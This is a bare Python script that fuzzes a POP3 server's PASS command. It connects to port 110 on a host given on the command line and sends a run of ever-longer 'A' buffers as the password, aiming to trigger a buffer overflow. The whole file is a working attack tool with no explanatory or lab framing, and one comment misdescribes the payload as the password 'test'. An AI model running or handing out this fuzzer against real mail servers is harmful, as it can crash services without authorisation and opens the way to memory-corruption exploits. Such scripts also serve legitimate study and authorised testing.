#!/usr/bin/python

import socket
import sys

def arguments():
	if len(sys.argv) != 2:
		print("Missing argument")
		print("Example: " + sys.argv[0] + " [host]")
		print("Usage: " + sys.argv[0] + " 10.0.0.1/example.com")
		exit()


def buffer():
	buff = ["A"]
	count = 100

	while len(buff) <= 30:
		buff.append("A" * count)
		count += 200

	return buff


def fuzzing():
	buff = buffer()

	for bts in buff:
		connect(bts)


def connect(bts):
	print("\nFuzzing PASS with " + str(len(bts)) + " bytes")

	host = sys.argv[1]

	try:
		sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		sck.connect((host, 110)) 			# connect to IP, POP#3 port
		sck.recv(1024)						# receive banner

		sck.send("USER test\r\n")			# send username "test"
		sck.recv(1024)						# receive reply

		sck.send("PASS " + bts + "\r\n")	# send password "test"
		sck.recv(1024)						# receive reply

		sck.send("QUIT\r\n")				# quit session
		sck.close()

		print("\nDone!")
	except Exception as e:
		print("Connection error: " + str(e))


def main():
	arguments()
	fuzzing()


main()